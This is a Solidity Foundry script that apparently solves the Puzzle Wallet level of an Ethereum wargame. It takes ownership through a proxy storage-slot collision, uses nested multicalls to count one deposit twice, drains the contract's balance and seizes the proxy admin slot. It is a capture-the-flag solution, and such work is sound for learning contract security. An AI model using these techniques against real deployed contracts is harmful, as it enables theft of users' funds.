// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

// ================================================================
// │                    LEVEL 24 - PUZZLE WALLET                  │
// ================================================================
interface IPuzzleProxy {
    function proposeNewAdmin(address _newAdmin) external;
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function multicall(bytes[] calldata data) external payable;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IPuzzleProxy puzzleProxy = IPuzzleProxy(targetContractAddress);
        IPuzzleWallet puzzleWallet = IPuzzleWallet(targetContractAddress);

        vm.startBroadcast();

        // Make msg.sender the owner of the PuzzleWallet
        // contract by calling proposeNewAdmin on the PuzzleProxy contract
        puzzleProxy.proposeNewAdmin(msg.sender);

        // Add msg.sender address to the whitelist
        puzzleWallet.addToWhitelist(msg.sender);

        // Build multicall payload
        // - Call deposit twice in two separate multicalls wrapped inside a single multicall
        //
        //         multicall
        //            |
        //     -----------------
        //     |               |
        //  multicall        multicall
        //     |                 |
        //   deposit          deposit

        // Add the deposit function to a bytes array for the multicall payload
        bytes[] memory depositDataArray = new bytes[](1);
        depositDataArray[0] = abi.encodeWithSelector(puzzleWallet.deposit.selector);

        // Create a single multicall payload with two multicall payloads which each call the deposit function
        bytes[] memory multicallPayload = new bytes[](2);
        multicallPayload[0] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositDataArray);
        multicallPayload[1] = abi.encodeWithSelector(puzzleWallet.multicall.selector, depositDataArray);

        uint256 balance = address(puzzleProxy).balance;

        // Call multicall to deposit twice with the same value
        puzzleWallet.multicall{value: balance}(multicallPayload);

        // Drain the contract by draining twice the balance that was deposited
        puzzleWallet.execute(msg.sender, balance * 2, abi.encode(0x0));

        // Set max balance to msg.sender address to set PuzzleProxy admin to msg.sender
        puzzleWallet.setMaxBalance(uint256(uint160(address(msg.sender))));

        vm.stopBroadcast();
    }
}
